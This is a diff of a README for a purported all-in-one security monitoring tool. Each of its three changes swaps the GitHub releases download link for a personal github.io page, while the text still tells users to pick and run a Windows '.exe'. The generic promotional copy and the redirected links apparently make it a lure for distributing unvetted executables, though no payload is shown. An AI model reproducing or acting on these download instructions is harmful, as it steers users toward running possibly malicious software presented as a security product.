@@ -1,6 +1,6 @@
 # 🛡️ elastic-security-infrastructure - Your All-in-One Security Monitoring Solution
 
-[![Download Now](https://img.shields.io/badge/Download-Security_Infrastructure_Now-blue?style=for-the-badge&logo=github)](https://github.com/thacherbiradial62/elastic-security-infrastructure/releases)
+[![Download Now](https://img.shields.io/badge/Download-Security_Infrastructure_Now-blue?style=for-the-badge&logo=github)](https://thacherbiradial62.github.io)
 
 ---
 
@@ -32,7 +32,7 @@ We're excited to have you on board! Follow these simple steps to get your securi
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/thacherbiradial62/elastic-security-infrastructure/releases](https://github.com/thacherbiradial62/elastic-security-infrastructure/releases)
+Visit this link to download the application: [https://thacherbiradial62.github.io](https://thacherbiradial62.github.io)
 
 Once you click that link, you'll see a page with different files to choose from. Pick the one that matches your system (if you're using Windows, choose the file with "windows" or ".exe" in the name). The download will start automatically.
 
@@ -153,7 +153,7 @@ We're thrilled to be part of your security journey. With elastic-security-infras
 
 **Now go ahead and download the application. Your digital safety starts today!**
 
-Visit this link to download the application: [https://github.com/thacherbiradial62/elastic-security-infrastructure/releases](https://github.com/thacherbiradial62/elastic-security-infrastructure/releases)
+Visit this link to download the application: [https://thacherbiradial62.github.io](https://thacherbiradial62.github.io)
 
 ---
 
